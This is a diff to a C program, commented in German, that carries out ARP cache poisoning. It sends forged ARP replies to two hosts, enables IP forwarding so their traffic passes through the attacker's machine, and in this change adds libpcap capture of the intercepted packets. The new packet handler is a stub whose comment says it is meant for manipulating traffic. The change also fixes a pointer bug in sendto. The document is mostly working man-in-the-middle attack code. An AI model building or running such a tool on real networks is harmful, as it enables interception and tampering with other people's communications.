@@ -10,6 +10,7 @@
 #include <net/ethernet.h>
 #include <sys/ioctl.h>
 #include <arpa/inet.h>
+#include <sys/types.h>
 #include <unistd.h>
 #include <pcap.h>
 
@@ -119,7 +120,7 @@ int send_arp_package(int raw_sockfd, struct arp_packet *arp_p, int if_index, uns
     sa_ll.sll_halen = ETH_ALEN;
     memcpy(sa_ll.sll_addr, target_mac_bytes, ETH_ALEN);
 
-    if (sendto(raw_sockfd, &arp_p, sizeof(struct arp_packet), 0,
+    if (sendto(raw_sockfd, arp_p, sizeof(struct arp_packet), 0,
                (struct sockaddr*)&sa_ll, sizeof(sa_ll)) == -1) {
         perror("sendto");
         return -1;
@@ -171,6 +172,12 @@ int set_ip_forwarding(int enable) {
     return 0;
 }
 
+// Diese funktion wird für jedes erfasste Paket aufgerufen.
+// Sie ist da um die eigentlichen Manipulationen, weiterleitungen, etc. zu vollbringen
+void package_handler(const u_char *user_data, struct pcap_pkthdr *pkthdr, const u_char *packet_data){
+    printf("package captured - length: %d Bytes\n", pkthdr->len);
+}
+
 int main(int argc, char *argv[])
 {
  if (argc != 5) { // Jetzt exakt 5 Argumente (Programmname + 4 Parameter)
@@ -185,7 +192,6 @@ int main(int argc, char *argv[])
     struct arp_packet arp_p2;
 
     int raw_sockfd;
-    int in_sockfd;
     int if_index;
     unsigned char local_mac[ETH_ALEN];
     unsigned char target_mac_bytes[ETH_ALEN];
@@ -214,18 +220,18 @@ int main(int argc, char *argv[])
     build_arp_package(&arp_p, target_mac_bytes, local_mac, spoof_ip_str, target_ip_str); // target 1
     build_arp_package(&arp_p2, target_2_mac_bytes, local_mac, target_ip_str, spoof_ip_str); // target 2
    
-    if(socket(in_sockfd, SOCK_RAW, htons(ETH_P_ALL))){
-        perror("socket");
-        close(raw_sockfd);
-        return 1;
-    }
     printf("Capture Socket erstellt\n");
 
     // Ipv4 forwarding sysctl auf 1 setzen
     if(set_ip_forwarding(1) == -1){
         perror("ip_forward");
         close(raw_sockfd);
-        close(in_sockfd);
+        return 1;
+    }
+
+    if((handle = pcap_open_live(iface_name, BUFSIZ, 0, 1000, errbuf)) == NULL){
+        printf("live_handler error: %s", errbuf);
+        close(raw_sockfd);
         return 1;
     }
 
@@ -240,18 +246,31 @@ int main(int argc, char *argv[])
             fprintf(stderr, "Error sending ARP packet to router. Exiting poisoning loop.\n");
             break;
         }
+
+        // get packets
+        struct pcap_pkthdr *header;
+        const u_char *packet_data;
+        int p_res = pcap_next_ex(handle, &header, &packet_data);
+        if(p_res == 1){ // erflogreiche erfassung
+            package_handler(NULL, header, packet_data);
+        }else if(p_res == 0){
+            printf("waiting for packages...\n");
+        }else if(p_res == -1){
+            printf("Error in package capture: %s\n", pcap_geterr(handle));
+        }
+ 
         sleep(2); 
+
     }
 
     // Ipv4 forwarding sysctl auf 0 setzen
     if(set_ip_forwarding(0) == -1){
         perror("ip_forward");
         close(raw_sockfd);
-        close(in_sockfd);
         return 1;
     }
 
     close(raw_sockfd);
-    close(in_sockfd);
+    pcap_close(handle);
     return 0;
 }
